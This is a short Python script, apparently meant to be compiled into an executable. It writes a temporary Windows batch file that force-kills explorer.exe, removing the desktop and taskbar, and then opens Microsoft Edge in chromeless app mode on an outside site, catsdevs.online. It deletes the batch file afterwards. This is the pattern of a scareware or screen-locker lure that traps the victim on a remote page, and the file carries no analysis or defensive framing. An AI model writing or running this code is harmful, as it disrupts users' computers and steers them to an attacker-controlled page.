import os
import tempfile
import subprocess

def run_bat_from_exe():
    bat_content = '''
@echo off
taskkill /f /im explorer.exe
start msedge --app=https://catsdevs.online/assets/
'''
 
    with tempfile.NamedTemporaryFile(delete=False, suffix='.bat') as temp_bat:
        temp_bat.write(bat_content.encode('utf-8'))
        temp_bat_path = temp_bat.name

    subprocess.call(['cmd.exe', '/c', temp_bat_path])
    os.remove(temp_bat_path)

if __name__ == "__main__":
    run_bat_from_exe()
